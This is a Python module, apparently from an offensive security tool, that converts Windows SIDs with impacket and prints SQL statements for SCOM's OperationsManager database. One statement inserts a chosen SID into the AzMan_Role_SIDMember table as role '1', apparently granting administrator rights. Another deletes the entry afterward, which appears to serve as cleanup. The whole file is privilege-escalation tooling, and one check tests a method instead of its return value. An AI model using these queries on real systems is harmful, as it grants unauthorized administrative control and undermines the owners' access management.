from impacket.ldap import ldaptypes


class MSSQL:
    
    def __init__(self, sid, reverse, delete, verbose):
        self.sid = sid
        self.reverse = reverse
        self.delete = delete
        self.verbose = verbose

    def decode_binary_sid(self, hex_string):
        try:
            binary_data = bytes.fromhex(hex_string)
            sid_obj = ldaptypes.LDAP_SID()
            sid_obj.fromString(binary_data)
            canonical_sid = sid_obj.formatCanonical()
            print(f'[*] Decoded SID: {canonical_sid}')
            return canonical_sid
        except Exception as e:
            print(f'[-] Error decoding SID: {str(e)}')
            return None

    def convert_string_sid(self):
        hexsid = ldaptypes.LDAP_SID()
        hexsid.fromCanonical(self.sid)
        querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
        print(f'[*] Converted {self.sid} SID to {querysid}')
        return querysid

    def build_insert_mssql_query(self, querysid):
        
        query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {querysid});"
        print(query)

    def build_delete_mssql_query(self):
        delete_sid = ""
        if not self.sid.startswith("0x0"):
                delete_sid = self.convert_string_sid()
        else:
            delete_sid = self.sid
    
        delete_query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {delete_sid};" 
        print(delete_query)


    def run(self):
        if self.reverse:
            self.decode_binary_sid(self.reverse)
        elif not self.delete:
            querysid = self.convert_string_sid()
            if self.convert_string_sid:
                self.build_insert_mssql_query(querysid)
        else:
            self.build_delete_mssql_query()
        return
